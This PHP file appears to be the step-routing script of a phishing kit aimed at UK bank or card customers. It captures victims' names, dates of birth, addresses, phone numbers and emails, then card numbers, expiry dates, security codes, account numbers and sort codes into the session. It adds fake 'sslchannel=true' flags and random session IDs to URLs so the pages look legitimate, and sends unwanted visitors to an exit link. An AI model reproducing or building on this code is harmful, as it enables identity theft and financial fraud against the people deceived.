<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";


if (isset($_GET['id'])) {
    if (intval($_GET['id']) === 1) {
        $_SESSION['edit'] = 1;
        header('Location: Step1.php?sslchannel=true&sessionid=' . generateRandomString(130));
        exit;
    } elseif (intval($_GET['id']) === 2) {
        $_SESSION['edit'] = 1;
        header('Location: Step2.php?sslchannel=true&sessionid=' . generateRandomString(130));
        exit;
    } elseif (intval($_GET['id']) === 3) {
        $_SESSION['name'] = $_POST['name'];
        $_SESSION['dob'] = $_POST['dob'];
        $_SESSION['email'] = $_POST['email'];
        $_SESSION['telephone'] = $_POST['telephone'];
        $_SESSION['address'] = $_POST['address'];
        $_SESSION['town'] = $_POST['town'];
        $_SESSION['postcode'] = $_POST['postcode'];
        header('Location: Step3.php?sslchannel=true&sessionid=' . generateRandomString(130));
        exit;
    } elseif (intval($_GET['id']) === 4) {
        $_SESSION['ccname'] = $_POST['ccname'];
        $_SESSION['ccno'] = $_POST['ccno'];
        $_SESSION['ccexp'] = $_POST['ccexp'];
        $_SESSION['secode'] = $_POST['secode'];
        $_SESSION['account'] = $_POST['account'];
        $_SESSION['sortcode'] = $_POST['sortcode'];
        header('Location: Step3.php?sslchannel=true&sessionid=' . generateRandomString(130));
        exit;
    } else {
        header('Location: ' . $ExitLink);
        exit;
    }
} else {
    header('Location: ' . $ExitLink);
    exit;
}
?>